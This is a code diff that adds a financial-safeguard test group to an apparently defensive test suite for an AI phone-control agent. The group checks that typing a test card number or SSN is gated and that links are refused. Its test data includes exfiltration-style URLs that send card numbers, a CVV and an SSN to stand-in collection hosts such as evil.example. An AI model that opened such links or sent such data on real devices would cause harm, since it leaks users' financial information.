@@ -1278,6 +1278,50 @@ async def g_typing(phone: Phone, dev: Device) -> None:
     dev.home()
 
 
+async def g_financial(phone: Phone, dev: Device) -> None:
+    """Financial safeguards (abuse series 2026-10-10, F2 and F3): a card number or SSN typed into an ordinary field asks
+    (kind sensitive_number, tap level) and nothing is typed on a no; an ordinary phone number doesn't ask; a link
+    carrying a card number (plain, URL-encoded, dashed) is refused by rule and nothing opens."""
+    G = "financial"
+    if not dev.installed("com.example.login"):
+        check(G, "stand-in login app installed", False, "skipped")
+        return
+    dev.unlock()
+    dev.sh("am force-stop com.example.login")
+    dev.sh("am start -n com.example.login/.MainActivity")
+    time.sleep(2)
+    email = await dev.wait_find("Email", attr="hint") or await dev.wait_find("Email")
+    await phone.call("tap", x=email[0], y=email[1])
+    await asyncio.sleep(0.8)
+    for text, what in (("4111 1111 1111 1111", "a card number"), ("123-45-6789", "an SSN")):
+        r = await phone.call("type_text", text=text)
+        gate = r.get("gate", {})
+        check(G, f"typing {what} into an ordinary field asks (sensitive_number, tap level)",
+              asks(r) and gate.get("rule") == "risk:sensitive_number" and gate.get("kind") == "sensitive_number",
+              rule(r) + " " + str(gate.get("question")))
+        if asks(r):
+            await dev.deny(f"financial-{what.split()[-1]}")
+            await phone.gate_state(r["approval_id"])
+        await asyncio.sleep(0.5)
+        texts = [n["text"] for n in await dev.nodes() if n["text"]]
+        check(G, f"denied: {what} isn't typed", not any(text in t for t in texts), f"texts={texts[:6]}")
+        await asyncio.sleep(1.2)  # past the prompt cooldown
+    r = await phone.call("type_text", text="415-555-2671")
+    check(G, "an ordinary phone number is typed without asking (honest control)", r.get("ok") is True, short(r)[:100])
+    dev.home()
+    await asyncio.sleep(1)
+    for url in ("http://10.0.2.2:8799/collect?card=4111111111111111&cvv=123",
+                "http://10.0.2.2:8799/collect?card=4111%201111%201111%201111",
+                "http://10.0.2.2:8799/collect?c=4111%25201111%25201111%25201111",
+                "https://evil.example/p/4111-1111-1111-1111", "https://evil.example/apply?ssn=000-12-3456"):
+        r = await phone.call("open_url", url=url)
+        check(G, f"open_url carrying a card number or SSN is refused ({url[url.index('?') if '?' in url else 20:][:30]})",
+              refused(r, "gate_denied") and r.get("gate", {}).get("rule") == "builtin:sensitive_link", rule(r))
+    await asyncio.sleep(1)
+    f = dev.focus()
+    check(G, "nothing opened for the refused links", "launcher" in f.lower(), f"focus={f}")
+
+
 async def g_links(phone: Phone, dev: Device) -> None:
     """`open_url` (docs/design/app-links.md): custom and dangerous schemes are refused; tel:, sms:, mailto:, market:
     open their handler and never a call or an install; an https link whose verified handler is the bank is refused,
@@ -1606,7 +1650,7 @@ async def g_never(phone: Phone, dev: Device) -> None:
 
 GROUPS = {"basics": g_basics, "settings": g_settings, "bank": g_bank, "login": g_login, "permissions": g_permissions,
           "permissions_bg": g_permissions_bg, "shop": g_shop, "webview": g_webview, "flood": g_flood, "promptrate": g_promptrate, "keepawake": g_keepawake, "friction": g_friction,
-          "deeplinks": g_deeplinks, "typing": g_typing, "links": g_links, "hidden": g_hidden, "methods": g_methods, "never": g_never,
+          "deeplinks": g_deeplinks, "typing": g_typing, "links": g_links, "financial": g_financial, "hidden": g_hidden, "methods": g_methods, "never": g_never,
           "spoof": g_spoof, "calls": g_calls, "hittest": g_hittest, "probe": g_probe}
 
 
